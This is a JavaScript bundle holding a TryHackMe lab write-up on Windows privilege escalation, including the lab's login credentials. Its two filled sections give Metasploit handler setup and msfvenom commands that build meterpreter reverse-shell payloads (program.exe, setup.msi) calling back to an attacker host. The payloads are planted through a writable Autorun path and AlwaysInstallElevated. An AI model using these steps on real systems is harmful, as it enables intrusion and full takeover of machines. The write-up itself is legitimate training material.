"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8144],{3905:(e,t,a)=>{a.d(t,{Zo:()=>c,kt:()=>k});var n=a(67294);function r(e,t,a){return t in e?Object.defineProperty(e,t,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[t]=a,e}function o(e,t){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),a.push.apply(a,n)}return a}function i(e){for(var t=1;t<arguments.length;t++){var a=null!=arguments[t]?arguments[t]:{};t%2?o(Object(a),!0).forEach((function(t){r(e,t,a[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):o(Object(a)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(a,t))}))}return e}function l(e,t){if(null==e)return{};var a,n,r=function(e,t){if(null==e)return{};var a,n,r={},o=Object.keys(e);for(n=0;n<o.length;n++)a=o[n],t.indexOf(a)>=0||(r[a]=e[a]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(n=0;n<o.length;n++)a=o[n],t.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(r[a]=e[a])}return r}var s=n.createContext({}),p=function(e){var t=n.useContext(s),a=t;return e&&(a="function"==typeof e?e(t):i(i({},t),e)),a},c=function(e){var t=p(e.components);return n.createElement(s.Provider,{value:t},e.children)},m="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},d=n.forwardRef((function(e,t){var a=e.components,r=e.mdxType,o=e.originalType,s=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),m=p(a),d=r,k=m["".concat(s,".").concat(d)]||m[d]||u[d]||o;return a?n.createElement(k,i(i({ref:t},c),{},{components:a})):n.createElement(k,i({ref:t},c))}));function k(e,t){var a=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=a.length,i=new Array(o);i[0]=d;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l[m]="string"==typeof e?e:r,i[1]=l;for(var p=2;p<o;p++)i[p]=a[p];return n.createElement.apply(null,i)}return n.createElement.apply(null,a)}d.displayName="MDXCreateElement"},71670:(e,t,a)=>{a.r(t),a.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>u,frontMatter:()=>o,metadata:()=>l,toc:()=>p});var n=a(87462),r=(a(67294),a(3905));const o={},i="Windows PrivEsc Arena",l={unversionedId:"Tryhackme/Windows PrivEsc Arena/Windows privesc arena",id:"Tryhackme/Windows PrivEsc Arena/Windows privesc arena",title:"Windows PrivEsc Arena",description:"Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open. Your credentials are user:password321",source:"@site/writeups/Tryhackme/Windows PrivEsc Arena/Windows privesc arena.md",sourceDirName:"Tryhackme/Windows PrivEsc Arena",slug:"/Tryhackme/Windows PrivEsc Arena/",permalink:"/writeups/Tryhackme/Windows PrivEsc Arena/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Willow",permalink:"/writeups/Tryhackme/Willow/"},next:{title:"Wireshark 101",permalink:"/writeups/Tryhackme/Wireshark 101/"}},s={},p=[{value:"Connecting to TryHackMe network",id:"connecting-to-tryhackme-network",level:2},{value:"Deploy the vulnerable machine",id:"deploy-the-vulnerable-machine",level:2},{value:"Registry Escalation - Autorun",id:"registry-escalation---autorun",level:2},{value:"Registry Escalation - AlwaysInstallElevated",id:"registry-escalation---alwaysinstallelevated",level:2},{value:"Service Escalation - Registry",id:"service-escalation---registry",level:2},{value:"Service Escalation - Executable Files",id:"service-escalation---executable-files",level:2},{value:"Privilege Escalation - Startup Applications",id:"privilege-escalation---startup-applications",level:2},{value:"Service Escalation - DLL Hijacking",id:"service-escalation---dll-hijacking",level:2},{value:"Service Escalation - binPath",id:"service-escalation---binpath",level:2},{value:"Service Escalation - Unquoted Service Paths",id:"service-escalation---unquoted-service-paths",level:2},{value:"Potato Escalation - Hot Potato",id:"potato-escalation---hot-potato",level:2},{value:"Password Mining Escalation - Configuration Files",id:"password-mining-escalation---configuration-files",level:2},{value:"Password Mining Escalation - Memory",id:"password-mining-escalation---memory",level:2},{value:"Privilege Escalation - Kernel Exploits",id:"privilege-escalation---kernel-exploits",level:2}],c={toc:p},m="wrapper";function u(e){let{components:t,...a}=e;return(0,r.kt)(m,(0,n.Z)({},c,a,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"windows-privesc-arena"},"Windows PrivEsc Arena"),(0,r.kt)("p",null,"Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open. Your credentials are user:password321"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://tryhackme.com/room/windowsprivescarena"},"Windows PrivEsc Arena"))),(0,r.kt)("h2",{id:"connecting-to-tryhackme-network"},"Connecting to TryHackMe network"),(0,r.kt)("p",null,"To complete this room and access the vulnerable Windows machine, you need to first connect to TryHackMe's VPN. If you've not done this before, first complete the ",(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/openvpn"},"OpenVPN room")," and learn how to connect."),(0,r.kt)("h2",{id:"deploy-the-vulnerable-machine"},"Deploy the vulnerable machine"),(0,r.kt)("p",null,"This room will teach you a variety of Windows privilege escalation tactics, including kernel exploits, DLL hijacking, service exploits, registry exploits, and more. This lab was built utilizing Sagi Shahar's privesc workshop (",(0,r.kt)("a",{parentName:"p",href:"https://github.com/sagishahar/lpeworkshop"},"https://github.com/sagishahar/lpeworkshop"),") and utilized as part of The Cyber Mentor's Windows Privilege Escalation Udemy course (",(0,r.kt)("a",{parentName:"p",href:"http://udemy.com/course/windows-privilege-escalation-for-beginners"},"http://udemy.com/course/windows-privilege-escalation-for-beginners"),")."),(0,r.kt)("p",null,"All tools needed to complete this course are on the ",(0,r.kt)("strong",{parentName:"p"},"user")," desktop (C:\\Users\\user\\Desktop\\Tools)."),(0,r.kt)("p",null,"Let's first connect to the machine.  RDP is open on port 3389.  Your credentials are:"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"username"),": user\n",(0,r.kt)("strong",{parentName:"p"},"password"),": password321"),(0,r.kt)("p",null,"For any administrative actions you might take, your credentials are:"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"username"),": TCM\n",(0,r.kt)("strong",{parentName:"p"},"password"),": Hacker123"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Deploy the machine and log into the user account via RDP"),(0,r.kt)("li",{parentName:"ol"},"Open a command prompt and run 'net user'. Who is the other non-default user on the machine?")),(0,r.kt)("h2",{id:"registry-escalation---autorun"},"Registry Escalation - Autorun"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Detection")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Windows VM")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Open command prompt and type: ",(0,r.kt)("inlineCode",{parentName:"li"},"C:\\Users\\User\\Desktop\\Tools\\Autoruns\\Autoruns64.exe")),(0,r.kt)("li",{parentName:"ol"},"In Autoruns, click on the \u2018Logon\u2019 tab."),(0,r.kt)("li",{parentName:"ol"},"From the listed results, notice that the \u201cMy Program\u201d entry is pointing to \u201cC:\\Program Files\\Autorun Program\\program.exe\u201d."),(0,r.kt)("li",{parentName:"ol"},"In command prompt type: ",(0,r.kt)("inlineCode",{parentName:"li"},'C:\\Users\\User\\Desktop\\Tools\\Accesschk\\accesschk64.exe -wvu "C:\\Program Files\\Autorun Program"')),(0,r.kt)("li",{parentName:"ol"},"From the output, notice that the \u201cEveryone\u201d user group has \u201cFILE_ALL_ACCESS\u201d permission on the \u201cprogram.exe\u201d file.")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Exploitation")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Kali VM")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Open command prompt and type: ",(0,r.kt)("inlineCode",{parentName:"li"},"msfconsole")),(0,r.kt)("li",{parentName:"ol"},"In Metasploit (msf > prompt) type: ",(0,r.kt)("inlineCode",{parentName:"li"},"use multi/handler")),(0,r.kt)("li",{parentName:"ol"},"In Metasploit (msf > prompt) type: ",(0,r.kt)("inlineCode",{parentName:"li"},"set payload windows/meterpreter/reverse_tcp")),(0,r.kt)("li",{parentName:"ol"},"In Metasploit (msf > prompt) type: ",(0,r.kt)("inlineCode",{parentName:"li"},"set lhost [Kali VM IP Address]")),(0,r.kt)("li",{parentName:"ol"},"In Metasploit (msf > prompt) type: ",(0,r.kt)("inlineCode",{parentName:"li"},"run")),(0,r.kt)("li",{parentName:"ol"},"Open an additional command prompt and type: ",(0,r.kt)("inlineCode",{parentName:"li"},"msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe")),(0,r.kt)("li",{parentName:"ol"},"Copy the generated file, program.exe, to the Windows VM.")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Windows VM")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Place program.exe in \u2018C:\\Program Files\\Autorun Program\u2019."),(0,r.kt)("li",{parentName:"ol"},"To simulate the privilege escalation effect, logoff and then log back on as an administrator user.")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Kali VM")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Wait for a new session to open in Metasploit."),(0,r.kt)("li",{parentName:"ol"},"In Metasploit (msf > prompt) type: ",(0,r.kt)("inlineCode",{parentName:"li"},"sessions -i [Session ID]")),(0,r.kt)("li",{parentName:"ol"},"To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid")),(0,r.kt)("hr",null),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Click 'Completed' once you have successfully elevated the machine")),(0,r.kt)("h2",{id:"registry-escalation---alwaysinstallelevated"},"Registry Escalation - AlwaysInstallElevated"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Detection")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Windows VM")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Open command prompt and type: reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer"),(0,r.kt)("li",{parentName:"ol"},"From the output, notice that \u201cAlwaysInstallElevated\u201d value is 1."),(0,r.kt)("li",{parentName:"ol"},"In command prompt type: reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer"),(0,r.kt)("li",{parentName:"ol"},"From the output, notice that \u201cAlwaysInstallElevated\u201d value is 1.")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Exploitation")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Kali VM")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Open command prompt and type: msfconsole"),(0,r.kt)("li",{parentName:"ol"},"In Metasploit (msf > prompt) type: use multi/handler"),(0,r.kt)("li",{parentName:"ol"},"In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp"),(0,r.kt)("li",{parentName:"ol"},"In Metasploit (msf > prompt) type: set lhost ","[Kali VM IP Address]"),(0,r.kt)("li",{parentName:"ol"},"In Metasploit (msf > prompt) type: run"),(0,r.kt)("li",{parentName:"ol"},"Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=","[Kali VM IP Address]"," -f msi -o setup.msi"),(0,r.kt)("li",{parentName:"ol"},"Copy the generated file, setup.msi, to the Windows VM.")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Windows VM")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Place \u2018setup.msi\u2019 in \u2018C:\\Temp\u2019."),(0,r.kt)("li",{parentName:"ol"},"Open command prompt and type: msiexec /quiet /qn /i C:\\Temp\\setup.msi")),(0,r.kt)("p",null,"Enjoy your shell! :)"),(0,r.kt)("h2",{id:"service-escalation---registry"},"Service Escalation - Registry"),(0,r.kt)("h2",{id:"service-escalation---executable-files"},"Service Escalation - Executable Files"),(0,r.kt)("h2",{id:"privilege-escalation---startup-applications"},"Privilege Escalation - Startup Applications"),(0,r.kt)("h2",{id:"service-escalation---dll-hijacking"},"Service Escalation - DLL Hijacking"),(0,r.kt)("h2",{id:"service-escalation---binpath"},"Service Escalation - binPath"),(0,r.kt)("h2",{id:"service-escalation---unquoted-service-paths"},"Service Escalation - Unquoted Service Paths"),(0,r.kt)("h2",{id:"potato-escalation---hot-potato"},"Potato Escalation - Hot Potato"),(0,r.kt)("h2",{id:"password-mining-escalation---configuration-files"},"Password Mining Escalation - Configuration Files"),(0,r.kt)("h2",{id:"password-mining-escalation---memory"},"Password Mining Escalation - Memory"),(0,r.kt)("h2",{id:"privilege-escalation---kernel-exploits"},"Privilege Escalation - Kernel Exploits"))}u.isMDXComponent=!0}}]);